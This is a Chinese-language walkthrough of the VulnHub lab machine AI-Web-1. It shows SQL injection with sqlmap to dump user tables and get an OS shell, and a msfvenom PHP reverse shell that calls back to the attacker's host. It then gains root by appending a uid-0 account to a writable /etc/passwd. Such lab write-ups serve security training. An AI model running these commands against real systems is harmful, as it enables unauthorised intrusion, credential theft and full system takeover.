# vulnhub之aiweb1的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745716&idx=1&sn=b146f541ea7613b20843a36c9f2dcacd&chksm=87148a74b0630362cc03278c5334fa5d20af0c2eb5a68a329d04fc390bfcf952e4c5f0c35d85&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745716&idx=1&sn=b146f541ea7613b20843a36c9f2dcacd&chksm=87148a74b0630362cc03278c5334fa5d20af0c2eb5a68a329d04fc390bfcf952e4c5f0c35d85&scene=27#wechat_redirect)

本周实践的是vulnhub的aiweb1镜像，下载地址，https://download.vulnhub.com/aiweb/AI-Web-1.0.7z，

地址扫描，sudo netdiscover -r 192.168.137.0/24，

![](../Images/c2f97fd4bd440d44884c7c44af159869.png)

端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.66，

![](../Images/7e582fc79ebebe59ecd73f53c7f5b0aa.png)

根据扫描提示，验证出一个能输入的url，

![](../Images/53150277cd7a4a3cbeb3691ab40a8438.png)

这种可以直接怀疑有sql注入漏洞，输入1' or '1'='1，手动验证成功，

![](../Images/d5daca3324893a100b240d1de8a71e30.png)

这就可以上sqlmap了，先用wireshark抓个包，

![](../Images/ce5258c7f2145c697649ec1ec5c49251.png)

拷贝内容成文本文件post.txt，

POST /se3reTdir777/ HTTP/1.1  
Host: 192.168.137.66  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 22  
Origin: http://192.168.137.66  
Connection: keep-alive  
Referer: http://192.168.137.66/se3reTdir777/  
Upgrade-Insecure-Requests: 1  
  
uid=1&Operation=Submit

一顿扫描，

sudo sqlmap -r post.txt --dbs，  
sudo sqlmap -r post.txt --current-user，  
sudo sqlmap -r post.txt -D aiweb1 --tables，  
sudo sqlmap -r post.txt -D aiweb1 -T systemUser --columns，  
sudo sqlmap -r post.txt -D aiweb1 -T systemUser -C id,password,userName --dump，

虽然拿到了几个用户名密码，但是发现都没啥用，前两个破解不开，后一个能破解开，但也无法ssh，

![](../Images/7d54cca2257951ea8558108f2d3fb2d5.png)

还有最后一招，sudo sqlmap -r post.txt --os-shell，

但是要求输入一个可写的目录的绝对路径，

于是又通过目录爆破找到这个目录，

sudo dirb http://192.168.137.66/ -X .php,.txt,.zip,.html  

先是找到一个可访问的url，

http://192.168.137.66/m3diNf0/info.php，  

![](../Images/f63d7d45bbaaf108836118e5533ff906.png)

然后在这个url页面里找到了可用的信息，/home/www/html/web1x443290o2sdf92213，

![](../Images/41498b423077d2d8a506b9d6138f2cbc.png)

最终经过验证，确认这个可写目录的绝对路径为，/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads，

os-shell就能拿到了，发现不是root，接下来就得想法提权，  

![](../Images/c9080370d4f9e8988839aac34703717b.png)

os-shell下是不能交互的，很多shell命令也不方便执行，先重新反弹一个shell出来，

制作后门文件，sudo msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.137.2 LPORT=4444 R > shell.php ，

攻击机上开个监听，

use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set lhost 192.168.137.2  
set lport 4444  
run

还是利用sql注入的漏洞，把木马文件上传到可写的目录，

sudo sqlmap -r post.txt --file-write /home/kali/shell.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/webshell.php，

![](../Images/bb219dddeefb335daf35665497e82924.png)

在外面访问，http://192.168.137.66/se3reTdir777/uploads/webshell.php，就能看到攻击机监听的反弹shell过来了，

发现当前账户对/etc/passwd有可写权限，这就好办了，自己加个账户吧，

转一下密码，perl -le 'print crypt("password","salt")'，

把账户添加进/etc/passwd，echo "hacker:sa3tHJ3/KuYvI:0:0:hacker:/root:/bin/bash" >> /etc/passwd，

确认一下，cat /etc/passwd | grep hacker，

为了执行su命令，还得通过python -c 'import pty;pty.spawn("/bin/bash")'把shell改成交互式的，  

![](../Images/df1dc59e1cc80789f51bfb9b8acb9d8d.png)

至此拿root权限成功。
